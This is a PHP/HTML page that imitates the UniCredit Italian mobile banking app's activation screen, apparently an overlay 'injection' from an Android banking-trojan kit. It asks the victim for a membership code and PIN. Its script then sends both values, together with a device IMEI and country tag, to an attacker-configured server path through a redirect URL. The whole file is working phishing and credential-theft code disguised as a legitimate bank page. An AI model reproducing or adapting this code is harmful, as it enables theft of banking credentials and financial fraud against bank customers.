<!-- 2.38 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/com.unicredit/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img style="float: left;margin-top: 4px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAARCAIAAACEg8GMAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6Q0Q0RjNCMEFCNzdDMTFFODg1RUFBOEMxM0ZCRUVFQTAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6Q0Q0RjNCMEJCNzdDMTFFODg1RUFBOEMxM0ZCRUVFQTAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpDRDRGM0IwOEI3N0MxMUU4ODVFQUE4QzEzRkJFRUVBMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpDRDRGM0IwOUI3N0MxMUU4ODVFQUE4QzEzRkJFRUVBMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pl5N43EAAAEHSURBVHjaYjQMzmXAC1jgLG5ODjlJUSkx4VfvPly/+/jP378IFexsrIcWdbGyMP/4+ev3n788XByMjIzlffN3HzsPVQEUn7Vq+9x1u+DmzWnK6yxKfPz89Y37T5ggQsjSQJBSNwlI6qkrAkkmBkIAi4r///9zcbCDGah+gYB///7+/PxhbW/7r9+/N+47jkVFeqiHqZr037//3FPrgB5DV9GQHeXnaNE2a+X6Pcf//vuHHmJsrCw+9mZVExbuOHIWu0tZWJiZmJjOXr2D0y///v67ePP+tx8/0FQwS2qZQ1hA1x2/eOP9p684zciJ9ts+s0lCRBBPiAGD6v8/SDAhAUaC6QMgwAA7i3AT0dn2lAAAAABJRU5ErkJggg==">
        <img style="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI0AAAAcCAIAAADTBqsUAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RUU5QUZBMjBCNzdDMTFFODg4QTFEREE0OUNCMDc5OEIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RUU5QUZBMjFCNzdDMTFFODg4QTFEREE0OUNCMDc5OEIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpFRTlBRkExRUI3N0MxMUU4ODhBMUREQTQ5Q0IwNzk4QiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpFRTlBRkExRkI3N0MxMUU4ODhBMUREQTQ5Q0IwNzk4QiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Po5lnXMAAAxuSURBVHja7FoJVFNH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">
        <img style="float: right;margin-top: 3px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6RERFRUMzQkJCNzdDMTFFOEEzMEVFMjQwNjYwMUQzMTYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6RERFRUMzQkNCNzdDMTFFOEEzMEVFMjQwNjYwMUQzMTYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpEREVFQzNCOUI3N0MxMUU4QTMwRUUyNDA2NjAxRDMxNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpEREVFQzNCQUI3N0MxMUU4QTMwRUUyNDA2NjAxRDMxNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv6k9SYAAAJySURBVHjaYjQMzmUgF7DAWczMzIHOlkEulkfPX1+wYc/X7z+I1czIyFgUH+BqabD5wGkPG+N///7NWr3j779/RGn2cTDzsjUt6Z597vq9izfvlyUHn7h08/z1u/g1M4EdzBTr6zR1+ZbzN+7/////6Lmr567dDfe0I+hssGYmZmlx4WMXrv0DuxPo2gs37ooI8DEzMRHWzMjIwMLC/O7DF4iQjZFWuIfd+Rt3CfoZavbfv/8E+LiBDFV5qYLYgNOXby3etI8oZwNt+PDpi4K0OETz779/l2078OnLN+I0//174ca9AGcLdjbWu49fcLKzqchKEZNIQJr//2eYvXqHhZ6GvobSnYfPjp2/lhTkKishQlAzs6SWOZD68PmrjISIi4XB4XNXz169Y2OkbaSlcunWfWA6A4alqY5ajI+Ttqr805dvv3z7ga4ZCC7euB/gYiktJnzs4vVLtx5425ua6aq+/fDJxlArN8YPqEdHRT7A2fLG/Sev3n1E1/zz1+/7T18kBLgCw+/U5ZsnLt400FACJh4dVfm5a3dOXrp538mLmkoy0d6O56/fef3+EyiO0XKVg5leVWroiu2Hl2878OPnLz5urr///n/59h2WeZja8uMFeLnTG6eg5CoIOHDqEjAEy5JCpMWEpi7f+v7TZ2BwwgE3JwcvD9fXHz/RnQ0HD56+OnP1ToSXXZCr1cfP399/+gKMS04ONjUF6YmVGcCIrJqwEJJhGXEVBjxcHCFuNn5OFkBH/vv/n4mR6d+/v8cv3uiYvRqe1RnxlyRcHOyCfDzA2ALmtq/ff777+AnZFyz4k8G3Hz+/wXyICQACDAA2qRwAjzvNzAAAAABJRU5ErkJggg==">
    </div>
    <h3>
        Benvenuto nella APP Mobile
        <br>
        Banking di UniCredit!
    </h3>
    <h4>
        Con questa APP potrai operare sul tuo conto e sulla tua Genius Card in modo semplice, facile e in assoulata sirucurezza. <br><br>
        Per poter utilizzare l'APP è <b>necessario attivarla</b> (solo al primo accesso). Ti bastano solo pochi minuti, comincia inserendo il <b>Codice di Adesione</b> e il <b>PIN</b> di banca via internet e premi "Avanti".
    </h4>
    <form action="null" method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="Codice Adesione">

        <input type="password" class="field" name="pin" id="pin" placeholder="Pin">

        <b class="text-center">RECUPERO PIN</b>

        <div class="footer">
            <input type="button" class="button1" disabled value="Anulla">
            <input type="button" class="button2" id="input_submitBtn" value="Avanti">
        </div>
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('pin');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_unicredit|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
